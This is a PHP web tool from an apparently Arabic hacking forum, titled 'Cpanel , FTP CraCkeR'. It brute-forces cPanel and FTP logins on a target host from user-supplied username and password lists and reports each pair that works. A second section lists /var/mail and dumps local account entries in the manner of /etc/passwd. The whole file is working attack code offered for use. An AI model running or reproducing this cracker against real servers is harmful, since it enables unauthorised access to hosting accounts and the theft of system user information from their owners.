<?php


$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];
if($target == ""){
$target = "localhost";
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
</head>
<title>Cpanel , FTP CraCkeR</title>
<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
<div align="center">
<form method="POST" style="border: 1px solid #000000">
        <div align="center">
			<table id="table1" border="0" cellSpacing="0" cellPadding="0" width="100%">
				<tr>
					<td width="277" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 10pt; font-family: tahoma, arial, helvetica, verdana">
					<img border="0" src="http://www.aljyyosh.com/vb/aljyyosh/hh_01.gif" width="303" height="179"></td>
					<td background="http://www.aljyyosh.com/vb/aljyyosh/hh_02.gif" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 10pt; font-family: tahoma, arial, helvetica, verdana">
					<div align="center">
						<map id="FPMap0" name="FPMap0">
						<area shape="rect" coords="206, 162, 268, 177" href="http://www.aljyyosh.com/vb/">
						<area shape="rect" coords="141, 162, 199, 178" href="http://www.aljyyosh.com/vb/usercp.php">
						<area shape="rect" coords="75, 163, 138, 178" href="http://www.aljyyosh.info">
						<area shape="rect" coords="11, 163, 67, 178" href="http://www.aljyyosh.com/vb/sendmessage.php">
						</map>
						<img border="0" src="http://www.aljyyosh.com/vb/aljyyosh/hh_33.jpg" usemap="#FPMap0"></div>
					</td>
					<td width="303" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 10pt; font-family: tahoma, arial, helvetica, verdana">
					<img border="0" src="http://www.aljyyosh.com/vb/aljyyosh/hh_03.gif" width="304" height="179"></td>
				</tr>
			</table>
		</div>
		<p><a href="http://www.aljyyosh.com/vb/" style="text-decoration: none">
		AlJyYoSh.CoM</a></p>
		<table border="1" width="67%" bordercolorlight="#008000" bordercolordark="#003700">
                <tr>
                        <td>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">
                <span lang="ar-sa">هوست السيرفر</span> :</font><font face="Arial">
        </font><font face="Arial" color="#CC0000">
        <input type="text" name="target" size="16" value="<? echo $target ?>" style="border: 2px solid #1D1D1D; background-color: #000000; color:#008000; font-family:Verdana; font-weight:bold; font-size:13px"></font></b></p>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
                        <div align="center">
                                <table border="1" width="57%" bordercolorlight="#008000" bordercolordark="#003700">
                                        <tr>
                                                <td align="center">
                                                                                                <span lang="ar-sa"><font color="#FF0000"><b>اليوزرات</b></font></span></td>
                                                <td>
                                                <p align="center">
                                                                                                <span lang="ar-sa"><font color="#FF0000"><b>الباسبوردات</b></font></span></td>
                                        </tr>
                                </table>
                        </div>
                        <p align="center">&nbsp;<textarea rows="20" name="users" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><? echo $users ?>
</textarea><textarea rows="20" name="passwords" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><? echo $pass ?></textarea><br>
        <br>
                                <font style="font-weight:700" size="2" face="Tahoma" color="#008000">
                                                <span lang="ar-sa">نوع التخمين</span></font><font style="font-size: 12pt;" size="-3" face="Verdana"><span style="font-size: 9pt;">&nbsp;
                                                <font face="Tahoma">
                                                <input name="cracktype" value="cpanel" style="font-weight: 700;" checked type="radio"></font></span></font><b><font size="2" face="Tahoma">
                                                Cpanel</font><font size="2" color="#cc0000" face="Tahoma">
                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
                                                (2082)</font></b><font size="2" face="Tahoma"><b> </b>
                                                </font>
                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
                                                <span style="font-size: 9pt;"><font face="Tahoma">
                                                <input name="cracktype" value="ftp" style="font-weight: 700;" type="radio"></font></span></font><font style="font-weight: 700;" size="2" face="Tahoma">
                                                </font><span style="font-weight: 700;">
                                                <font size="2" face="Tahoma">Ftp </font>
                                                <font size="2" color="#FFFFFF" face="Tahoma">
                                                (21)</font></span></p>
        <p align="center">&nbsp;&nbsp;&nbsp;&nbsp;
        <input type="submit" value="تخمين" name="submit" style="color: #008000; font-weight: bold; border: 1px solid #333333; background-color: #000000"></p>
                        </td>
                </tr>
        </table>
</div>

    <p align="center"></td>
  </tr>
  </form>

<?php
function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
Please Check The Target Hostname .</font></font></b></p>";exit;}
elseif ( curl_errno($ch) == 0 ){
print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\" style=\"font-size: 9pt\"><b><font color=\"#008000\">
Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";}curl_close($ch);}
function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
<font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
Please Check The Target Hostname .</font></font></b></p>";exit;}
elseif ( curl_errno($ch) == 0 ){
print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\" style=\"font-size: 9pt\"><b><font color=\"#008000\">
Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";}curl_close($ch);}
if(isset($submit) && !empty($submit)){
if(empty($users) && empty($pass)){ print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
if(empty($pass) ){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
$userlist=explode("\n",$users);
$passlist=explode("\n",$pass);
print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
Cracking Process Started, Please Wait ...</font></b><br><br>";
foreach ($userlist as $user) {
$pureuser = trim($user);
foreach ($passlist as $password ) {
$purepass = trim($password);
if($cracktype == "ftp"){
ftp_check($target,$pureuser,$purepass,$connect_timeout);
}
if ($cracktype == "cpanel")
{
cpanel_check($target,$pureuser,$purepass,$connect_timeout);
}
}
}
}
?>



      <body bgcolor="#000000">


      <form style="border: 0px ridge #FFFFFF">




    <p align="center"></td>
  </tr><div align="center">

                <tr>



<input type="submit"   name="user" value="user"><option value="name"></select>
</form>
          </div>
  
           <div align="center">
                <table border="1" width="11%" bordercolorlight="#008000" bordercolordark="#006A00">
                        <tr>
                                <td bordercolorlight="#008000" bordercolordark="#006A00" align="center">
   <textarea method='POST'  rows=20 cols=14 wrap=off name="xp">


<?php


      if ($_GET['user'] )


      system('ls /var/mail');




 if ($_GET['plugin'] )

                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }


?>
